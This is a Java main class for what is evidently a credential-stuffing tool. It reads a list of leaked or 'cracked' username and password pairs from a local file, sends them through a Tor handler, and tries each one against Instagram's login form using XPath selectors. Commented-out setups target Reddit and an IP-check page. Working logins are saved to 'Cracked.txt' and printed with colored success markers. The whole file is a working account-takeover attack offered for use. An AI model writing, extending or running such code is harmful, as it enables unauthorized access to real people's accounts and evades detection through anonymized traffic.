import IO.FileHandler;
import Network.Handler;
import Network.TorHandler;
import Objects.LoginData;
import Objects.LoginDom;
import Objects.LoginList;

import java.io.File;
import java.io.IOException;


public class Main {
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_BLACK = "\u001B[30m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_BLUE = "\u001B[34m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_CYAN = "\u001B[36m";
    public static final String ANSI_WHITE = "\u001B[37m";

    public static void main(String[] args) throws IOException {
        Handler handler = new TorHandler();
        File myObj = new File("E:\\NextSync\\Aufträge\\Cracked.txt");
        LoginList list = FileHandler.readFile("E:\\NextSync\\Aufträge\\CrackedSpotifyACC");
        LoginDom dom = new LoginDom("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[1]/div/label/input", "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[2]/div/label/input", "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[3]/button", "/html/body/div[2]/div/div/div/div[2]/button[1]", "https://www.instagram.com/","/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[2]");
        //LoginDom dom = new LoginDom("/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[1]/label/div/div[2]/div/input", "/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[2]/label/div/div[2]/div/input", "/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[3]/div/div", null, "https://whatismyipaddress.com/de/meine-ip", "/html/body/div/div/div/div[2]/main/div/div/div[1]");
        //LoginDom dom = new LoginDom("//*[@id=\"loginUsername\"]","//*[@id=\"loginPassword\"]","/html/body/div/main/div[1]/div/div[2]/form/fieldset[5]/button",null,"https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F","/html/body/div/main/div[1]/div/div[2]/form/fieldset[2]/div");
        try {
            for (int i = 0; i < list.list.size(); i++) {//https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F
                if (handler.getResponse(list.list.get(i), dom)) {
                    FileHandler.addAcc(myObj, list.list.get(i));
                    System.out.println("Username: " + list.list.get(i).username + "  Password: " + list.list.get(i).password);
                    System.out.println("Status: [" + ANSI_GREEN + "SUCCESS" + ANSI_RESET + "]");
                } else {
                    System.out.println("Username: " + list.list.get(i).username + "  Password: " + list.list.get(i).password);
                    System.out.println("Status: [" + ANSI_RED + "FAILED" + ANSI_RESET + "]");
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
